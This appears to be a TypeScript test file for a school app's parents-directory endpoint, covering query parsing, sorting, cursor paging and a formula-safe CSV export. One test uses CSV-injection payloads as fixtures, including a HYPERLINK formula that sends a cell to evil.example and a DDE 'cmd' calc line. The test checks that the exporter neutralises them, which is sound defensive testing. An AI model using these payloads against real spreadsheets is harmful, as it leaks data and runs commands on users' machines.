// lib/guardianRoster.ts: the read-only parents directory (GET /guardians/roster
// and its CSV). Pure functions only: the query parsing, the join of guardians to
// the students the caller can read, the filters, the stable order and cursor
// paging, and the formula-safe CSV. The caseload scoping and RLS are exercised
// by test/integration/guardians-roster.test.mjs.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { HttpError } from "../../src/lib/errors.js";
import {
  ROSTER_CSV_COLUMNS,
  ROSTER_DEFAULT_LIMIT,
  ROSTER_MAX_LIMIT,
  buildRoster,
  filterStudents,
  pageRoster,
  parseRosterQuery,
  rosterCsv,
  rosterFilename,
  studentSurname,
  toRosterGuardian,
  toRosterStudent,
  type RosterGuardian,
  type RosterStudent,
} from "../../src/lib/guardianRoster.js";

const S1 = "11111111-1111-4111-8111-111111111111";
const S2 = "22222222-2222-4222-8222-222222222222";
const S3 = "33333333-3333-4333-8333-333333333333";
const S4 = "44444444-4444-4444-8444-444444444444";

const student = (id: string, fullName: string | null, classYear: string | null = "2027", archived = false): RosterStudent => ({ id, fullName, classYear, archived });
let n = 0;
const guardian = (studentId: string, fullName: string, extra: Partial<RosterGuardian> = {}): RosterGuardian => ({
  id: `g${String(++n).padStart(4, "0")}`,
  studentId,
  fullName,
  email: null,
  phone: null,
  relationship: null,
  alertsEnabled: true,
  receivesReports: true,
  ...extra,
});

// ---- query parsing ---------------------------------------------------------------

test("parseRosterQuery: defaults", () => {
  assert.deepEqual(parseRosterQuery({}), { q: null, classYear: null, includeArchived: false, limit: ROSTER_DEFAULT_LIMIT, cursor: null, offset: 0 });
  assert.equal(ROSTER_DEFAULT_LIMIT, 100);
  assert.equal(ROSTER_MAX_LIMIT, 500);
});

test("parseRosterQuery: q is trimmed, blank means no search, and 100 characters is the most", () => {
  assert.equal(parseRosterQuery({ q: "  lee  " }).q, "lee");
  assert.equal(parseRosterQuery({ q: "   " }).q, null);
  assert.equal(parseRosterQuery({ q: "x".repeat(100) }).q, "x".repeat(100));
  assert.throws(() => parseRosterQuery({ q: "x".repeat(101) }));
});

test("parseRosterQuery: limit is a whole number from 1 to 500", () => {
  assert.equal(parseRosterQuery({ limit: "25" }).limit, 25);
  assert.equal(parseRosterQuery({ limit: "500" }).limit, 500);
  for (const bad of ["0", "-1", "501", "1.5", "abc", ""]) assert.throws(() => parseRosterQuery({ limit: bad }), undefined, `limit ${JSON.stringify(bad)}`);
});

test("parseRosterQuery: includeArchived is the word true or false", () => {
  assert.equal(parseRosterQuery({ includeArchived: "true" }).includeArchived, true);
  assert.equal(parseRosterQuery({ includeArchived: "false" }).includeArchived, false);
  assert.throws(() => parseRosterQuery({ includeArchived: "yes" }));
  assert.throws(() => parseRosterQuery({ includeArchived: "1" }));
});

test("parseRosterQuery: classYear is trimmed and 10 characters at most", () => {
  assert.equal(parseRosterQuery({ classYear: " 2027 " }).classYear, "2027");
  assert.equal(parseRosterQuery({ classYear: "" }).classYear, null);
  assert.throws(() => parseRosterQuery({ classYear: "2027202720272027" }));
});

test("parseRosterQuery: a cursor or an offset, never both", () => {
  assert.equal(parseRosterQuery({ offset: "40" }).offset, 40);
  assert.throws(() => parseRosterQuery({ offset: "-1" }));
  assert.throws(() => parseRosterQuery({ offset: "x" }));
  assert.throws(() => parseRosterQuery({ cursor: "abc", offset: "10" }));
  assert.equal(parseRosterQuery({ cursor: "abc" }).cursor, "abc");
});

// ---- the student's surname -------------------------------------------------------

test("studentSurname: the last word, or the part before a comma, without a suffix", () => {
  assert.deepEqual(studentSurname("Maya Lee"), { last: "Lee", rest: "Maya" });
  assert.deepEqual(studentSurname("Lee, Maya"), { last: "Lee", rest: "Maya" });
  assert.deepEqual(studentSurname("Maya Ann Lee Jr."), { last: "Lee", rest: "Maya Ann" });
  assert.deepEqual(studentSurname("Cher"), { last: "Cher", rest: "" });
  assert.deepEqual(studentSurname("  Ana   Lopez  "), { last: "Lopez", rest: "Ana" });
  assert.deepEqual(studentSurname(null), { last: "", rest: "" });
  assert.deepEqual(studentSurname("   "), { last: "", rest: "" });
});

// ---- mapping database rows -------------------------------------------------------

test("toRosterGuardian and toRosterStudent keep only the listed fields and tidy blanks", () => {
  const g = toRosterGuardian({
    id: "g1",
    student_id: S1,
    full_name: " Ann Lee ",
    email: " ann@example.com ",
    phone: "  ",
    relationship: "",
    alerts_enabled: false,
    receives_reports: null,
    preferred_channel: "sms",
    is_primary: true,
    created_at: "2026-01-01",
  });
  assert.deepEqual(g, { id: "g1", studentId: S1, fullName: "Ann Lee", email: "ann@example.com", phone: null, relationship: null, alertsEnabled: false, receivesReports: true });

  const s = toRosterStudent({ id: S1, full_name: "Maya Lee", grad_year: 2027, archived_at: null, email: "maya@example.com", gpa: 4 });
  assert.deepEqual(s, { id: S1, fullName: "Maya Lee", classYear: "2027", archived: false });
  assert.equal(toRosterStudent({ id: S1, full_name: "Maya Lee", grad_year: " ", archived_at: "2026-01-01T00:00:00Z" }).classYear, null);
  assert.equal(toRosterStudent({ id: S1, full_name: "Maya Lee", grad_year: "", archived_at: "2026-01-01T00:00:00Z" }).archived, true);
});

// ---- filters on students ---------------------------------------------------------

test("filterStudents: archived students are left out unless asked for, and a class year narrows", () => {
  const all = [student(S1, "Maya Lee", "2027"), student(S2, "Noor Khan", "2028"), student(S3, "Old Timer", "2027", true)];
  assert.deepEqual(filterStudents(all, { classYear: null, includeArchived: false }).map((s) => s.id), [S1, S2]);
  assert.deepEqual(filterStudents(all, { classYear: null, includeArchived: true }).map((s) => s.id), [S1, S2, S3]);
  assert.deepEqual(filterStudents(all, { classYear: "2027", includeArchived: false }).map((s) => s.id), [S1]);
  assert.deepEqual(filterStudents(all, { classYear: "2027", includeArchived: true }).map((s) => s.id), [S1, S3]);
  assert.deepEqual(filterStudents(all, { classYear: "1999", includeArchived: true }), []);
});

// ---- the directory ---------------------------------------------------------------

test("buildRoster: ordered by the student's last name, then the guardian's name, stably", () => {
  const students = [student(S1, "Maya Zimmer"), student(S2, "Noor Adams"), student(S3, "Zed Adams")];
  const gs = [
    guardian(S1, "Zoe Zimmer"),
    guardian(S2, "Sam Adams"),
    guardian(S2, "Amy Adams"),
    guardian(S3, "Bo Adams"),
    guardian(S1, "Al Zimmer"),
  ];
  const out = buildRoster(students, gs, null).map((e) => `${e.entry.studentName} / ${e.entry.name}`);
  assert.deepEqual(out, ["Noor Adams / Amy Adams", "Noor Adams / Sam Adams", "Zed Adams / Bo Adams", "Maya Zimmer / Al Zimmer", "Maya Zimmer / Zoe Zimmer"]);
  // The same input in any order gives the same list.
  const again = buildRoster([...students].reverse(), [...gs].reverse(), null).map((e) => `${e.entry.studentName} / ${e.entry.name}`);
  assert.deepEqual(again, out);
});

test("buildRoster: two guardians with the same name on one student keep a fixed order by id", () => {
  const a = guardian(S1, "Pat Lee");
  const b = guardian(S1, "Pat Lee");
  const out = buildRoster([student(S1, "Maya Lee")], [b, a], null).map((e) => e.entry.id);
  assert.deepEqual(out, [a.id, b.id].sort());
});

test("buildRoster: the entry is exactly the listed fields", () => {
  const g = guardian(S1, "Ann Lee", { email: "ann@example.com", phone: "+1 555 010 0000", relationship: "mother", alertsEnabled: false, receivesReports: true });
  const [row] = buildRoster([student(S1, "Maya Lee", "2027")], [g], null);
  assert.deepEqual(row!.entry, {
    id: g.id,
    name: "Ann Lee",
    relationship: "mother",
    email: "ann@example.com",
    phone: "+1 555 010 0000",
    studentId: S1,
    studentName: "Maya Lee",
    classYear: "2027",
    receivesAlerts: false,
    receivesReports: true,
  });
});

test("buildRoster: a guardian whose student isn't in the list is not shown", () => {
  const out = buildRoster([student(S1, "Maya Lee")], [guardian(S1, "Ann Lee"), guardian(S2, "Someone Else")], null);
  assert.deepEqual(out.map((e) => e.entry.name), ["Ann Lee"]);
});

test("buildRoster: q finds a guardian's name or email, or the student's name, ignoring case and accents", () => {
  const students = [student(S1, "Maya Lee"), student(S2, "Noor Álvarez")];
  const gs = [guardian(S1, "Ann Lee", { email: "ANN.L@Example.com" }), guardian(S1, "Bo Chan"), guardian(S2, "Rosa Pérez")];
  const names = (q: string) => buildRoster(students, gs, q).map((e) => e.entry.name);
  assert.deepEqual(names("ann.l@example"), ["Ann Lee"]);
  assert.deepEqual(names("perez"), ["Rosa Pérez"]);
  assert.deepEqual(names("ROSA"), ["Rosa Pérez"]);
  assert.deepEqual(names("alvarez"), ["Rosa Pérez"], "the student's name");
  assert.deepEqual(names("maya").sort(), ["Ann Lee", "Bo Chan"], "the student's name finds each of their guardians");
  assert.deepEqual(names("maya lee").sort(), ["Ann Lee", "Bo Chan"]);
  assert.deepEqual(names("  Bo  "), ["Bo Chan"], "q is matched as typed after trimming; the caller trims");
  assert.deepEqual(names("nobody"), []);
});

test("buildRoster: q never matches an id, a phone or a field that isn't listed as searchable", () => {
  const g = guardian(S1, "Ann Lee", { phone: "555-0100", relationship: "mother" });
  const students = [student(S1, "Maya Lee")];
  assert.deepEqual(buildRoster(students, [g], g.id), []);
  assert.deepEqual(buildRoster(students, [g], S1), []);
  assert.deepEqual(buildRoster(students, [g], "555-0100"), []);
});

// ---- paging ----------------------------------------------------------------------

function sample(count: number) {
  const students = Array.from({ length: count }, (_, i) => student(`s${String(i).padStart(3, "0")}`, `First${i} Last${String(i).padStart(3, "0")}`));
  const gs = students.flatMap((s, i) => [guardian(s.id, `Parent A${i}`), guardian(s.id, `Parent B${i}`)]);
  return buildRoster(students, gs, null);
}

test("pageRoster: pages by cursor cover every row once, in order, and the last has no next cursor", () => {
  const rows = sample(7); // 14 entries
  const seen: string[] = [];
  let cursor: string | null = null;
  let pages = 0;
  for (;;) {
    const page = pageRoster(rows, { limit: 5, cursor, offset: 0 });
    assert.equal(page.total, 14);
    seen.push(...page.guardians.map((g) => g.id));
    pages++;
    if (!page.nextCursor) break;
    cursor = page.nextCursor;
    assert.ok(pages < 10, "ends");
  }
  assert.equal(pages, 3);
  assert.deepEqual(seen, rows.map((r) => r.entry.id));
  assert.equal(new Set(seen).size, 14);
});

test("pageRoster: exactly a full page has no next cursor, and an empty directory is an empty page", () => {
  const rows = sample(2); // 4 entries
  const page = pageRoster(rows, { limit: 4, cursor: null, offset: 0 });
  assert.equal(page.guardians.length, 4);
  assert.equal(page.nextCursor, null);
  assert.deepEqual(pageRoster([], { limit: 10, cursor: null, offset: 0 }), { guardians: [], total: 0, nextCursor: null });
});

test("pageRoster: a cursor still lands in the right place after the row it names is gone", () => {
  const rows = sample(5);
  const first = pageRoster(rows, { limit: 3, cursor: null, offset: 0 });
  const without = rows.filter((r) => r.entry.id !== first.guardians[2]!.id);
  const next = pageRoster(without, { limit: 3, cursor: first.nextCursor, offset: 0 });
  assert.equal(next.guardians[0]!.id, rows[3]!.entry.id);
});

test("pageRoster: offset pages from a position", () => {
  const rows = sample(5); // 10 entries
  const page = pageRoster(rows, { limit: 4, cursor: null, offset: 4 });
  assert.deepEqual(page.guardians.map((g) => g.id), rows.slice(4, 8).map((r) => r.entry.id));
  assert.ok(page.nextCursor);
  const past = pageRoster(rows, { limit: 4, cursor: null, offset: 50 });
  assert.deepEqual(past, { guardians: [], total: 10, nextCursor: null });
});

test("pageRoster: a cursor that isn't one of ours is a 400", () => {
  const rows = sample(3);
  for (const bad of ["not-base64!!", Buffer.from("not json").toString("base64url"), Buffer.from(JSON.stringify({ k: 5 })).toString("base64url"), Buffer.from(JSON.stringify({ k: "x".repeat(2000) })).toString("base64url")]) {
    assert.throws(
      () => pageRoster(rows, { limit: 2, cursor: bad, offset: 0 }),
      (e: unknown) => e instanceof HttpError && e.statusCode === 400,
      `cursor ${bad.slice(0, 20)}`
    );
  }
});

// ---- the CSV ---------------------------------------------------------------------

const entries = (gs: RosterGuardian[], students: RosterStudent[]) => buildRoster(students, gs, null).map((r) => r.entry);

test("rosterCsv: a header row, CRLF line ends, no byte-order mark, one line per guardian", () => {
  const csv = rosterCsv(entries([guardian(S1, "Ann Lee", { email: "ann@example.com", relationship: "mother" })], [student(S1, "Maya Lee", "2027")]));
  const lines = csv.split("\r\n");
  assert.equal(lines.length, 3, "header, one row, trailing line end");
  assert.equal(lines[2], "");
  assert.equal(lines[0], ROSTER_CSV_COLUMNS.join(","));
  assert.equal(lines[1], "Ann Lee,mother,ann@example.com,,Maya Lee,2027,Yes,Yes");
  assert.notEqual(csv.charCodeAt(0), 0xfeff);
  assert.ok(!csv.replace(/\r\n/g, "").includes("\n"));
});

test("rosterCsv: no guardians is just the header", () => {
  assert.equal(rosterCsv([]), ROSTER_CSV_COLUMNS.join(",") + "\r\n");
});

test("rosterCsv: commas, quotes and line breaks in a name are quoted", () => {
  const csv = rosterCsv(entries([guardian(S1, 'Lee, Ann "Annie"\nSr.', { email: "a@x.com" })], [student(S1, "Maya, Jr. Lee")]));
  assert.ok(csv.includes('"Lee, Ann ""Annie""\nSr."'), csv);
  assert.ok(csv.includes('"Maya, Jr. Lee"'), csv);
  // The quoted line break stays inside its cell: still header + one record.
  assert.equal(csv.split("\r\n").length, 3);
});

test("rosterCsv: an empty phone or email is an empty cell, never the word null", () => {
  const csv = rosterCsv(entries([guardian(S1, "Ann Lee", { email: "ann@example.com" }), guardian(S1, "Bo Lee", { phone: "555-0100", alertsEnabled: false, receivesReports: false })], [student(S1, "Maya Lee")]));
  assert.ok(!/null|undefined/.test(csv), csv);
  const rows = csv.split("\r\n");
  assert.equal(rows[1], "Ann Lee,,ann@example.com,,Maya Lee,2027,Yes,Yes");
  assert.equal(rows[2], "Bo Lee,,,555-0100,Maya Lee,2027,No,No");
});

test("rosterCsv: a cell a spreadsheet would run as a formula is neutralised, in every column", () => {
  const evil = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
  const csv = rosterCsv(
    entries(
      [guardian(S1, evil, { email: "=cmd|' /C calc'!A0", phone: "@SUM(1+1)", relationship: "-2+3" })],
      [student(S1, "+1 Maya Lee", "=2027")]
    )
  );
  const [header, row] = csv.split("\r\n");
  assert.equal(header, ROSTER_CSV_COLUMNS.join(","));
  const cells = parseCsvLine(row!);
  assert.equal(cells.length, ROSTER_CSV_COLUMNS.length);
  assert.equal(cells[0], `'${evil}`);
  assert.equal(cells[1], "'-2+3");
  assert.equal(cells[2], "'=cmd|' /C calc'!A0");
  assert.equal(cells[3], "'@SUM(1+1)");
  assert.equal(cells[4], "'+1 Maya Lee");
  assert.equal(cells[5], "'=2027");
  for (const c of cells.slice(0, 6)) assert.ok(c.startsWith("'"), c);
});

test("rosterCsv: a leading space or line break doesn't hide a formula", () => {
  const csv = rosterCsv(entries([guardian(S1, "  =1+1"), guardian(S1, "\t=1+1"), guardian(S1, "\n@x")], [student(S1, "Maya Lee")]));
  for (const cell of ["'  =1+1", "'\t=1+1", `"'\n@x"`]) assert.ok(csv.includes(cell), JSON.stringify(cell));
  // No record starts with a bare formula character.
  for (const line of csv.split("\r\n").slice(1)) assert.ok(!/^[=+\-@]/.test(line), line);
});

test("rosterFilename: the UTC date", () => {
  assert.equal(rosterFilename(new Date("2026-11-08T23:59:59Z")), "meridies-parents-2026-11-08.csv");
  assert.equal(rosterFilename(new Date("2026-11-09T00:00:00Z")), "meridies-parents-2026-11-09.csv");
  assert.equal(rosterFilename(new Date("2026-03-01T01:00:00+14:00")), "meridies-parents-2026-02-28.csv");
});

// ---- both routes carry a DB-backed limiter ---------------------------------------

test("the directory routes carry the DB-backed limits the brief names", () => {
  const src = readFileSync(new URL("../../src/routes/guardians.ts", import.meta.url), "utf8");
  assert.match(src, /app\.get\(\s*"\/roster"\s*,\s*\{[^}]*requireRole\("counselor"\)[^}]*limit\("guardians:roster", 60, 60\)/);
  assert.match(src, /app\.get\(\s*"\/roster\.csv"\s*,\s*\{[^}]*requireRole\("counselor"\)[^}]*limit\("guardians:roster-csv", 10, 3600\)/);
  assert.ok(!/serviceClient/.test(src), "the directory reads as the caller: RLS is the backstop");
});

/** Minimal RFC 4180 line reader for the one-record rows the tests build. */
function parseCsvLine(line: string): string[] {
  const out: string[] = [];
  let cur = "";
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (quoted) {
      if (ch === '"' && line[i + 1] === '"') {
        cur += '"';
        i++;
      } else if (ch === '"') quoted = false;
      else cur += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ",") {
      out.push(cur);
      cur = "";
    } else cur += ch;
  }
  out.push(cur);
  return out;
}
